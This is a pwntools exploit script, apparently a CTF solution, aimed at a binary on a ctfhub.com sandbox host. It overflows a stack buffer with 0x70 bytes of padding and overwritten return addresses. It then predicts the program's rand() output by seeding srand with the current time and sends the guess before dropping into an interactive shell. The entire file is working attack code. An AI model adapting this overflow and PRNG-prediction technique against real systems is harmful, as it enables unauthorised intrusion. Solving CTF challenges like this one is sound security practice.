from pwn import * 
from pwn import p64
from ctypes import *

debug = 0
gdb_is = 0

# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "challenge-a75c68062475dd2f.sandbox.ctfhub.com"
    r = connect(host,21831)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x40078b')
    pause()
    pass

libc = cdll.LoadLibrary('libc.so.6')
elf = ELF('./pwn')  


r.sendlineafter(b'someting:\n',b'A'* 0x70 + b'junkjunk'+ p64(0x000400285)+p64(0x0400777))
v0 = libc.time(0)
libc.srand(v0)
v3 = libc.rand()
print(f'v0 = {hex(v0)}')
print(f'v3 = {hex(v3)}')
r.sendline(str(v3).encode())

r.interactive()

